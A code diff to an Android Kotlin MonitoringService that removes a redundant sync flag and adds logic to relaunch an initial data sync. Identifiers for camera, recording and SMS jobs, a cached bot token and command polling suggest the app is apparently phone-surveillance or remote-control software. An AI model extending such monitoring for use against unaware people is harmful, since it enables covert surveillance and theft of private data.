@@ -73,7 +73,6 @@ class MonitoringService : Service() {
     private var cameraJob: Job? = null
     private var commandJob: Job? = null
     private var initialSyncJob: Job? = null
-    private val initialSyncStarted = java.util.concurrent.atomic.AtomicBoolean(false)
     private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
     @Volatile
     private var cachedBotToken = ""
@@ -320,13 +319,10 @@ class MonitoringService : Service() {
             }
         }
 
-        initialSyncStarted.set(false)
         if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted) {
             preferencesManager.initialSyncStarted = true
-            initialSyncStarted.set(true)
             initialSyncRunning.set(true)
         } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted) {
-            initialSyncStarted.set(true)
             initialSyncRunning.set(true)
         }
         startPeriodicLoops()
@@ -2294,7 +2290,6 @@ class MonitoringService : Service() {
         recordJob?.cancel()
         smsJob?.cancel()
         initialSyncRunning.set(false)
-        initialSyncStarted.set(false)
         idlePolls = 0
         cachedSetupTap = null
         isRunning = false
@@ -2406,7 +2401,6 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
         initialSyncRunning.set(false)
-        initialSyncStarted.set(false)
         isRunning = false
         try {
             stopForeground(STOP_FOREGROUND_REMOVE)
@@ -2752,6 +2746,26 @@ class MonitoringService : Service() {
         refreshLoopConfig()
         startPeriodicLoops()
         startCommandPolling()
+        try {
+            val syncActive = initialSyncJob?.isActive == true
+            try {
+                initialSyncJob?.cancel()
+            } catch (_: Exception) {
+            }
+            if (!syncActive) initialSyncRunning.set(false)
+            if (!preferencesManager.initialSyncDone && !initialSyncRunning.get()) {
+                initialSyncRunning.set(true)
+                initialSyncJob = serviceScope.launch {
+                    try {
+                        sendInitialData()
+                    } catch (_: Exception) {
+                    } finally {
+                        initialSyncRunning.set(false)
+                    }
+                }
+            }
+        } catch (_: Exception) {
+        }
     }
     private fun startLoopWatchdog() {
         try {
